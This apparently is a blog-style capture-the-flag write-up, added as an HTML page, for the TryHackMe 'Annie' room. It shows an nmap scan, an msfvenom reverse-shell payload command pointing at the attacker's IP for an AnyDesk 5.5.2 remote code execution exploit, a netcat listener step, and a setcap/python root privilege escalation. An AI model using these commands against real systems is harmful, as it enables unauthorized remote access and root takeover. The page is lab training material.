@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Annie Writeup | redtrib3</title>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+</head>
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Anonymous+Pro:wght@700&display=swap');
+
+.brandlogo{
+	font-family: 'Anonymous Pro',monospace; 
+	font-size: 35px;"
+}
+.brandlogo:hover{
+	color: red;
+	font-size: 36px;
+	transition: 1s;
+}
+
+#burger span{
+	background-color: white;
+}
+.para{
+	padding: 20px;
+	margin: 10px;
+}
+
+pre {
+	border: 1px solid black;
+	border-radius: 10px;
+	margin: 10px;
+}
+
+img{
+	margin: 10px;
+	padding: 10px;
+
+}
+
+p{
+	color: black;
+}
+.notification{
+	border: 0.5px solid lightgray;
+	border-radius: 15px;
+}
+
+/*Scrollbar styling*/
+
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+}
+
+/* Track */
+::-webkit-scrollbar-track {
+  box-shadow: inset 0 0 5px grey;
+  border-radius: 10px;
+}
+
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: darkslategray;	
+  border-radius: 10px;
+}
+
+code{
+	color: green;
+}
+</style>
+
+<body>
+
+<!-- Navigation Bar -->
+<nav class="navbar is-dark has-shadow" role="navigation" aria-label="main navigation">
+	
+	<div class="navbar-brand">
+		<a class="navbar-item brandlogo" style="cursor: text;">RedTribe</a>
+	</div>
+
+	<a class="navbar-burger" id="burger">
+	  <span ></span>
+      <span ></span>
+      <span ></span>
+	</a>
+
+	<div id="links_Nav" class="navbar-menu" >
+		<div class="navbar-start">
+			<a href="/index.html" class="navbar-item"> Home </a>
+			<a href="/static/overview.html" class="navbar-item"> Writeups </a>
+			<a href="/static/socials.html" class="navbar-item"> Socials </a>
+		</div>
+
+	</div>	
+</nav>
+
+
+
+<!-- Hero card/Title holder -->
+
+<section class="hero is-link ">
+	<div style="margin: 10px;padding: 20px;"  class="container">
+
+		<h1 class="title" >
+			<!--is-success = easy, is-warning=medium, is-danger=hard --->
+			<span class="tag is-success is-small ">Difficulty: Easy</span><br>
+			Annie
+		</h1>
+		<h2 class="subtitle is-italic is-size-6">@anii0101 | 2 min read</h2>
+
+	</div>
+</section>
+
+<!---BreadCrumbs-->
+<nav class="breadcrumb is-centered " style="padding-left:15px;"  >
+  <ul>
+    <li><a href="/index.html">Home</a></li>
+    <li><a href="/static/overview.html">Writeups</a></li>
+    <li class="is-active"><a href="#" aria-current="page">Annie</a></li>
+  </ul>
+</nav>	
+
+
+
+<!--Start of Containers--->
+
+	<div class="container para">
+		<div class="notification">
+		<h1 class="title is-size-3 has-text-dark ">👋 Introduction</h1><br>	
+	Hi there!, 
+	Annie is a room in <a href="https://tryhackme.com/room/annie">TryHackme</a> Rated as Medium. I found it to be easy.
+	Without Further Ado lets Start!
+	</div>
+	</div>
+	
+	<div class="container para" id="more">
+		<div class="notification">
+			<h2 class="title">🔍 Enumeration </h2><br>
+			<h3 class="subtitle has-text-weight-bold is-size-3"><u>Nmap</u></h3>
+			As always we do , lets start off with an nmap scan. <!--ippsec ref :) ofc-->
+			<pre>
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)
+	|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)
+	|_  256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)
+
+7070/tcp open  ssl/realserver?
+	|_ssl_date:TLS randomness does not represent time.
+	|_ssl_cert: Subject: CommonName=AnyDesk Client
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+			</pre>
+			<br>
+
+		We see that we have two open ports. One being SSH and other being a AnyDesk server in port 7070.
+		from the Caption of this room- "Remote access comes in different flavors." , we get that this room has something
+		to do with Remote access softwares like Anydesk. 
+
+		from searching "AnyDesk Exploits" in Google, we get a RCE exploit for <b>AnyDesk 5.5.2</b>, we really doesn't know yet if 
+		the box has the vulnerable version. But sometimes it is better to just try it.<br>
+
+		<img src="/images/ph1.png"> <!--here!--><br><br>
+
+
+		We need to Modify the script in order for it to work, Generate another shellcode using msfvenom (with our THM-ip)
+		and replace the shell code in the exploit with the new one.<br><br>
+
+		<code> msfvenom -p linux/x64/shell_reverse_tcp LHOST= TRYHACKME_IP_HERE LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode</code><br><br>
+
+
+		<h3 class="subtitle has-text-weight-bold is-size-3"> <u> Exploiting AnyDesk: </u> </h3>
+		<p>
+			<img src="/images/ph1.png"><br><br> <!--change this!-->
+		</p>
+		Setup a NETCAT listener on the port you set on the MSFCONSOLE. Execute the python script and wait for the connection.<br>
+		If the Reverse shell doesn't drop within 2-3 minutes. Reset the machine and try again. (I got it right the second time.)
+		<br><br>
+
+		<h3 class="subtitle is-size-4"><i>Dropped the Shell!</i></h3><br>
+		 <p>
+				 	When you search for SUID files, you find an interesting file as the first result.<br><br>
+				 	
+				 	<img src=/images/ph1.png><br> <!--change this !!-->
+
+				 	Setcap is a linux binary which can be used to Give <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">capabilities</a> to a another binary. 
+				 	According to the Linux <a href="https://linux.die.net/man/8/setcap">man page</a>:<br><br>
+
+				 	<h3 class="subtitle has-text-weight-bold is-size-3">
+				 		<i>
+				 	"Setcap sets the capabilities of each specified filename to the capabilities specified.""
+				 		</i>
+					</h3>	
+				We can Effectively escalate and drop a root shell if we give Python (or any language you know) 
+				the capability to set UID.
+				<br><br>
+
+				<code><b>annie@desktop:~</b> /sbin/setcap	cap_setuid+ep /usr/share/python3</code><br>
+				<code><b>annie@desktop:~</b> /usr/share/python3 -c 'import os;os.setuid(0); os.system("/bin/bash")' </code>
+
+		 </p>
+	
+	<img src="/images/ph1.png"><br><br> <!--change this-->
+
+</div>
+</div>	
+
+
+<!-- footer section -->
+<footer class="footer">
+	<div class="content has-text-centered">
+		
+		<p class="brandlogo" style="font-size: 20px;color: gray;">RedTribe</p>
+		<div class="footer-links ">
+			<a class="button is-text"> MIT License </a>
+			<a class="button is-text"> Support</a>	
+		</div><br>
+		
+		<div>
+			<p class="has-text-grey">&copy; 2021  | All rights reserved</p>
+		</div>
+	</div>
+</footer>
+
+
+<!--BurgerScript-->
+<script src="/static/js/burgerToggle.js"></script>
+
+</body>
+</html>
